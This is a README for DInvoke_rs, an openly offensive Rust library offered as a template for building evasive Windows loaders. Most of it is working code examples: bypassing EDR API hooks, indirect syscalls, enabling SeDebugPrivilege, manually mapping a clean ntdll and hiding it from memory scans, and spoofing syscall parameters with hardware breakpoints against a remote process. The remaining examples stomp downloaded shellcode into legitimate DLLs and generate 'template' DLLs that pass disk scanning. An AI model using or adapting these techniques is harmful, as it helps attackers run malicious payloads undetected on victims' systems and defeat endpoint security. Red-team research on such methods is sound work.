# DInvoke_rs

Rust port of [Dinvoke](https://github.com/TheWover/DInvoke). DInvoke_rs may be used for many purposes such as PE parsing, dynamic exported functions resolution, dynamically loading PE plugins at runtime, API hooks evasion and more. This project is meant to be used as a template (just add your own Rust code on top of it) or as a nested crate that can be imported on your own project.

Features:
* Dynamically resolve and invoke undocumented Windows APIs from Rust.
* Primitives allowing for strategic API hook evasion. 
* Indirect syscalls. **x64 only**
* Manually map PE modules from disk or directly from memory.
* PE headers parsing.
* Map PE modules into sections backed by arbitrary modules on disk. **Not Opsec**
* Module fluctuation to hide mapped PEs (concurrency supported). **Not Opsec**
* Syscall parameters spoofing through exception filter + hardware breakpoints. **x64 only**
* Module stomping and shellcode fluctuation.
* Template stomping.

# Credit
All the credits go to the creators of the original C# implementation of this tool:
* [The Wover](https://twitter.com/TheRealWover)
* [FuzzySec (b33f)](https://twitter.com/FuzzySec)
* [cobbr](https://twitter.com/cobbr_io)

# Content

- [Resolve exported function](#Resolving-Exported-APIs)
- [Dynamically invoke unmanaged code](#Invoking-Unmanaged-Code)
- [Execute Indirect Syscall](#Executing-indirect-syscall)
- [Manually map a PE from disk or memory](#Manual-PE-mapping)
- [Overload memory section](#Overload-memory-section)
- [Module fluctuation](#Module-fluctuation)
- [Use hardware breakpoints to spoof syscall parameters](#Syscall-parameters-spoofing)
- [Module stomping and Shellcode fluctuation](#Module-stomping-and-Shellcode-fluctuation)
- [Template stomping](#Template-stomping)

# Usage

Import this crate into your project by adding the following line to your `cargo.toml`:

```rust
[dependencies]
dinvoke_rs = "0.1.5"
```

# Examples
## Resolving Exported APIs

The example below demonstrates how to use DInvoke_rs to dynamically find and call exports of a DLL (ntdll.dll in this case).

1) Get ntdll's base address.
2) Use get_function_address() to find an export within ntdll.dll by name. This is done by walking and parsing the dll's EAT.
3) You can also find an export by ordinal by calling get_function_address_by_ordinal(). 

```rust

fn main() {

    // Dynamically obtain ntdll.dll's base address. 
    let ntdll = dinvoke_rs::dinvoke::get_module_base_address("ntdll.dll");

    if ntdll != 0 
    {
        println!("ntdll.dll base address is 0x{:X}", ntdll);
        
        // Dynamically obtain the address of a function by name.
        let nt_create_thread = dinvoke_rs::dinvoke::get_function_address(ntdll, "NtCreateThread");
        if nt_create_thread != 0
        {
            println!("NtCreateThread is at address 0x{:X}", nt_create_thread);
        }

        // Dynamically obtain the address of a function by ordinal.
        let ordinal_8 = dinvoke_rs::dinvoke::get_function_address_by_ordinal(ntdll, 8);
        if ordinal_8 != 0 
        {
            println!("The function with ordinal 8 is at addresss 0x{:X}", ordinal_8);
        }
    }   
}

```

## Invoking Unmanaged Code
In the example below, we use DInvoke_rs to dynamically call RtlAdjustPrivilege in order to enable SeDebugPrivilege for the current process token. This kind of execution will bypass any API hooks present in Win32. Also, it won't create any entry on the final PE Import Address Table, making it harder to detect the PE's behaviour without executing it.

```rust

fn main() {

    // Dynamically obtain ntdll.dll's base address. 
    let ntdll = dinvoke_rs::dinvoke::get_module_base_address("ntdll.dll");

    if ntdll != 0 
    {
        unsafe 
        {
            let func_ptr:  unsafe extern "system" fn (u32, u8, u8, *mut u8) -> i32; // Function header available at data::RtlAdjustPrivilege
            let ret: Option<i32>; // RtlAdjustPrivilege returns an NSTATUS value, which in Rust can be represented as an i32
            let privilege: u32 = 20; // This value matches with SeDebugPrivilege
            let enable: u8 = 1; // Enable the privilege
            let current_thread: u8 = 0; // Enable the privilege for the current process, not only for the current thread
            let e = u8::default(); // https://github.com/Kudaes/rust_tips_and_tricks/tree/main#transmute
            let enabled: *mut u8 = std::mem::transmute(&e); 
            dinvoke_rs::dinvoke::dynamic_invoke!(ntdll,"RtlAdjustPrivilege",func_ptr,ret,privilege,enable,current_thread,enabled); 

            match ret {
                Some(x) => 
                	if x == 0 { println!("NTSTATUS == Success. Privilege enabled."); } 
                  	else { println!("[x] NTSTATUS == {:X}", x as u32); },
                None => panic!("[x] Error!"),
            }
        } 
    }   
}


```

## Executing indirect syscall
In the next example, we use DInvoke_rs to execute the syscall that corresponds to the function NtQueryInformationProcess. Since the macro dinvoke::execute_syscall!() dynamically allocates and executes the shellcode required to perform the desired syscall, all hooks present in ntdll.dll are bypassed. The memory allocated is release once the syscall returns, avoiding the permanent presence of memory pages with execution permission.

```rust

use std::mem::size_of;
use windows::Win32::System::Threading::{GetCurrentProcess, PROCESS_BASIC_INFORMATION};
use dinvoke_rs::data::{NtQueryInformationProcess, PVOID};

fn main() {

    unsafe 
    {
        let function_type:NtQueryInformationProcess;
        let mut ret: Option<i32> = None; //NtQueryInformationProcess returns a NTSTATUS, which is a i32.
        let handle = GetCurrentProcess();
        let p = PROCESS_BASIC_INFORMATION::default();
        let process_information: PVOID = std::mem::transmute(&p); 
        let r = u32::default();
        let return_length: *mut u32 = std::mem::transmute(&r);
        dinvoke_rs::dinvoke::execute_syscall!(
            "NtQueryInformationProcess",
            function_type,
            ret,
            handle,
            0,
            process_information,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            return_length
        );

        let pbi:*mut PROCESS_BASIC_INFORMATION;
        match ret {
            Some(x) => 
                if x == 0 {
                    pbi = std::mem::transmute(process_information);
                    let pbi = *pbi;
                    println!("The Process Environment Block base address is 0x{:X}", pbi.PebBaseAddress as u64);
                },
            None => println!("[x] Error executing direct syscall for NtQueryInformationProcess."),
        }  

    }
}

```

## Manual PE mapping
In this example, DInvoke_rs is used to manually map a fresh copy of ntdll.dll, without any EDR hooks. Then that fresh ntdll.dll copy can be used to execute any desired function. 

This manual map can also be executed from memory (use manually_map_module() in that case), allowing the perform the classic reflective dll injection.

```rust

use dinvoke_rs::data::PeMetadata;

fn main() {

    unsafe 
    {

        let ntdll: (PeMetadata, isize) = dinvoke_rs::manualmap::read_and_map_module("C:\\Windows\\System32\\ntdll.dll", true, true).unwrap();

        let func_ptr:  unsafe extern "system" fn (u32, u8, u8, *mut u8) -> i32; // Function header available at data::RtlAdjustPrivilege
        let ret: Option<i32>; // RtlAdjustPrivilege returns an NSTATUS value, which is an i32
        let privilege: u32 = 20; // This value matches with SeDebugPrivilege
        let enable: u8 = 1; // Enable the privilege
        let current_thread: u8 = 0; // Enable the privilege for the current process, not only for the current thread
        let e = u8::default();
        let enabled: *mut u8 = std::mem::transmute(&e); 
        dinvoke_rs::dinvoke::dynamic_invoke!(ntdll.1,"RtlAdjustPrivilege",func_ptr,ret,privilege,enable,current_thread,enabled);

        match ret {
            Some(x) => 
                if x == 0 { println!("NTSTATUS == Success. Privilege enabled."); } 
                else { println!("[x] NTSTATUS == {:X}", x as u32); },
            None => panic!("[x] Error!"),
        }

    }
}

```

## Overload memory section
In the following sample, DInvoke_rs is used to create a file-backed memory section, overloading it afterwards by manually mapping a PE. The memory section will point to a legitimate file located in %WINDIR%\System32\ by default, but any other decoy module can be used.

This overload can also be executed mapping a PE from memory (as it is shown in the following example), allowing to perform the overload without writing the payload to disk.

```rust

use dinvoke_rs::data::PeMetadata;

fn main() {

    unsafe 
    {

        let payload: Vec<u8> = your_download_function();

        // This will map your payload into a legitimate file-backed memory section.
        let overload: (PeMetadata, isize) = dinvoke_rs::overload::overload_module(payload, "").unwrap();
        
        // Then any exported function of the mapped PE can be dynamically called.
        // Let's say we want to execute a function with header pub fn random_function(i32, i32) -> i32
        let func_ptr:  unsafe extern "Rust" fn (i32, i32) -> i32; // Function header
        let ret: Option<i32>; // The value that the called function will return
        let parameter1: i32 = 10;
        let parameter2: i32 = 20;
        dinvoke_rs::dinvoke::dynamic_invoke!(overload.1,"random_function",func_ptr,ret,parameter1,parameter2);

        match ret {
            Some(x) => 
                println!("The function returned the value {}", x),
            None => panic!("[x] Error!"),
        }

    }
}

```

## Module fluctuation
DInvoke_rs allows to hide mapped PEs when they are not being used, making it harder for EDR memory inspection to detect the presence of a suspicious dll in your process. 

For example, lets say we want to map a fresh copy of ntdll.dll in order to evade EDR hooks. Since two ntdll.dll in the same process could be considered a suspicious behaviour, we can map ntdll and hide it whenever we are not using it. This is very similar to the shellcode fluctuation technique, althought in this scenario we can take advantage of the fact that we are mapping a PE into a legitimate file-backed memory section, so we can replace the ntdll's content for the original decoy module's content that the section is pointing to.

```rust

use dinvoke_rs::dmanager::Manager;

fn main() {

    unsafe 
    {

        // The manager will take care of the hiding/remapping process and it can be used in multi-threading scenarios 
        let mut manager = Manager::new();

        // This will map ntdll.dll into a memory section pointing to cdp.dll. 
        // It will return the payload (ntdll) content, the decoy module (cdp) content and the payload base address.
        let overload: ((Vec<u8>, Vec<u8>), isize) = dinvoke_rs::overload::managed_read_and_overload("c:\\windows\\system32\\ntdll.dll", "c:\\windows\\system32\\cdp.dll").unwrap();
        
        // This will allow the manager to start taking care of the module fluctuation process over this mapped PE.
        // Also, it will hide ntdll, replacing its content with the legitimate cdp.dll content.
        let _r = manager.new_module(overload.1 as i64, overload.0.0, overload.0.1);

        // Now, if we want to use our fresh ntdll copy, we just need to tell the manager to remap our payload into the memory section.
        let _ = manager.map_module(overload.1 as i64);

        // After ntdll has being remapped, we can dynamically call RtlAdjustPrivilege (or any other function) without worrying about EDR hooks.
        let func_ptr:  unsafe extern "system" fn (u32, u8, u8, *mut u8) -> i32; // Function header available at data::RtlAdjustPrivilege
        let ret: Option<i32>; // RtlAdjustPrivilege returns an NSTATUS value, which is an i32
        let privilege: u32 = 20; // This value matches with SeDebugPrivilege
        let enable: u8 = 1; // Enable the privilege
        let current_thread: u8 = 0; // Enable the privilege for the current process, not only for the current thread
        let e = u8::default();
        let enabled: *mut u8 = std::mem::transmute(&e); 
        dinvoke_rs::dinvoke::dynamic_invoke!(overload.1,"RtlAdjustPrivilege",func_ptr,ret,privilege,enable,current_thread,enabled);

        match ret {
            Some(x) => 
                if x == 0 { println!("NTSTATUS == Success. Privilege enabled."); } 
                else { println!("[x] NTSTATUS == {:X}", x as u32); },
            None => panic!("[x] Error!"),
        }

        // Since we dont want to use our ntdll copy for the moment, we hide it again. It can we remapped at any time.
        let _ = manager.hide_module(overload.1 as i64);

    }
}

```

## Syscall parameters spoofing
In order to spoof the first 4 parameters of a syscall, DInvoke_rs has support for hardware breakpoints in combination with exception handlers. This allows to send not malicious parameters to a NT function, and after the EDR has inspected them, they are replaced by the original parameters before the syscall instruction is executed. For further information, check out the repository where the original idea comes from: [TamperingSyscalls](https://github.com/rad9800/TamperingSyscalls).

For now, this feature is implemented for the functions NtOpenProcess, NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory and NtCreateThreadEx. In order to use it, it's just needed to activate the feature, set the exception handler and call the desired function through Dinvoke.

```rust

use dinvoke_rs::data::{THREAD_ALL_ACCESS, ClientId};
use windows::{Win32::Foundation::HANDLE, Wdk::Foundation::OBJECT_ATTRIBUTES};

fn main() {
    unsafe
    {
        // We active the use of hardware breakpoints to spoof syscall parameters
        dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
        // We get the memory address of our function and set it as a VEH
        let handler = dinvoke::breakpoint_handler as usize;
        dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);

        let h = HANDLE {0: -1};
        let handle: *mut HANDLE = std::mem::transmute(&h);
        let access = THREAD_ALL_ACCESS; 
        let a = OBJECT_ATTRIBUTES::default(); // https://github.com/Kudaes/rust_tips_and_tricks/tree/main#transmute
        let attributes: *mut OBJECT_ATTRIBUTES = std::mem::transmute(&a);
        // We set the PID of the remote process 
        let remote_pid = 10952isize;
        let c = CLIENT_ID {unique_process: HANDLE {0: remote_pid}, unique_thread: HANDLE::default()};
        let client_id: *mut CLIENT_ID = std::mem::transmute(&c);
        // A call to NtOpenProcess is performed through Dinvoke. The parameters will be
        // automatically spoofed by the function and restored to the original values
        // before executing the syscall.
        let ret = dinvoke::nt_open_process(handle, access, attributes, client_id);

        println!("NTSTATUS: {:x}", ret);

        dinvoke_rs::dinvoke::use_hardware_breakpoints(false);
    }
}

```

## Module stomping and Shellcode fluctuation
Dinvoke_rs's overload crate now allows to perform module stomping by calling the `managed_module_stomping()` function. The first parameter of this function is the shellcode's content. The other two parameters modify the behaviour of the function, allowing three different execution paths commented below.

The best way to use this function in my opinion is by loading a legitimate dll into the process and allow Dinvoke to determine a good spot in that dll to stomp your shellcode to it. This is done by passing the dll's base address as the third parameter of `managed_module_stomping()`. The second argument must be zero. By doing this, Dinvoke will iterate over the dll's Exception data looking for a legitimate function big enough to stomp the shellcode on it.

```rust
let payload_content = download_function();
let my_dll = dinvoke_rs::dinvoke::load_library_a("somedll.dll");
let module = dinvoke_rs::overload::managed_module_stomping(&payload_content, 0, my_dll);

match module {
     Ok(x) => println!("The shellcode has been written to 0x{:X}.", x.1),
     Err(e) => println!("An error has occurred: {}", e),      
}
```

You can also specify the exact location where you want the shellcode to be stomped to by passing the address as the second parameter:

```rust
let payload_content = download_function();
let my_dll = dinvoke_rs::dinvoke::load_library_a("somedll.dll");
let my_big_enough_function = dinvoke_rs::dinvoke::get_function_address(my_dll, "somefunction");
let module = overload::managed_module_stomping(&payload_content, my_big_enough_function, 0);

match module {
     Ok(x) => println!("The shellcode has been written to 0x{:X}.", x.1),
     Err(e) => println!("An error has occurred: {}", e),      
}
```

Finally, you can allow Dinvoke to automatically decide the address where the shellcode will be stomped to. This is done by iterating over the Exception data of all loaded modules until finding a suitable function. This option may bring unexpected behaviours, so I do not really recommend it unless you don't have other option.
```rust
let payload_content = download_function();
let module = dinvoke_rs::overload::managed_module_stomping(&payload_content, 0, 0);

match module {
    Ok(x) => println!("The shellcode has been written to 0x{:X}.", x.1),
    Err(e) => println!("An error has occurred: {}", e),      
}
```

Once the shellcode has been stomped, you can use dmanager crate to hide/restomp your shellcode, allowing to perfom shellcode fluctuation:

```rust
let payload_content = download_function();
let my_dll = dinvoke_rs::dinvoke::load_library_a("somedll.dll");
let overload = dinvoke_rs::overload::managed_module_stomping(&payload_content, 0, my_dll).unwrap();
let mut manager = dinvoke_rs::dmanager::Manager::new();
let _r = manager.new_shellcode(overload.1, payload_content, overload.0).unwrap(); // The manager will take care of the fluctuation process
let _r = manager.hide_shellcode(overload.1).unwrap(); // We restore the memory's original content and hide our shellcode
 ... 
let _r = manager.stomp_shellcode(overload.1).unwrap(); // When we need our shellcode's functionality, we restomp it to the same location so we can execute it
let run: unsafe extern "system" fn () = std::mem::transmute(overload.1);
run();
let _r = manager.hide_shellcode(overload.1).unwrap(); // We hide the shellcode again
```

## Template stomping
Template stomping is a derivative of the module stomping technique tailored specifically for DLLs. Right now this technique only allows to load a DLL into the current process, remote processes are not supported.

The main objective is to create a template from a DLL by replacing the content of the `.text` section with arbitrary data, allowing to write the template on disk without raising alerts. This template is crafted in a way that it can be loaded into the process by calling `LoadLibrary`. Then, the original `.text` section content can be downloaded directly to the process' memory and stomped on the template's corresponding memory region. This technique can be effectively executed using two main functions: `generate_template` and `template_stomping`.

The `generate_template` function is designed to create the template from the original DLL by extracting the `.text` section content  and replacing it with arbitrary data. This ensures that the template maintains its structure but contains no meaningful executable code, apart from the entry points and TLS callbacks, which are replaced with dummy but functional assembly instructions. The original `.text` section content is saved separately in `payload.bin`, and the final template file is saved in `template.dll`.

```rust
fn main ()
{
    let template = dinvoke_rs::overload::generate_template(r"C:\Path\To\payload.dll", r"C:\Path\To\Output\Directory\");
    match template
    {
        Ok(()) => { println!("Template successfully generated.");}
        Err(x) => { println!("Error ocurred: {x}");}
    }
}
```

Then the template can be saved on disk in the **target system** and can be loaded in the current process by calling `LoadLibrary`. Once the template has been loaded by the SO, the next step involves stomping the original executable content stored in `payload.bin` into the `.text` section of the template. This process is performed by the `template_stomping` function, which stomps the original executable content into the right memory region taking care of all the details involved in the process.

```rust

fn main ()
{  
    unsafe
    {
        let mut payload = http_download_payload(); // Download payload.bin content directly to memory
        let stomped_dll = dinvoke_rs::overload::template_stomping(r"C:\Path\To\template.dll", &mut payload).unwrap();
        println!("Stomped DLL base address: 0x{:x}", stomped_dll.1);

        let function_ptr = dinvoke_rs::dinvoke::get_function_address(stomped_dll.1, "SomeRandomFunction");
        let function: extern "system" fn() = std::mem::transmute(function_ptr);
        function();
    }
}
```

This technique allows to load a DLL into disk backed memory regions without writing the real executable content to the filesystem (removing the need of private memory regions and evading EDR's static/dynamic analysis) and also allows to keep a clean call stack during the execution of the DLL's code, unlike what happens when we load a DLL reflectively.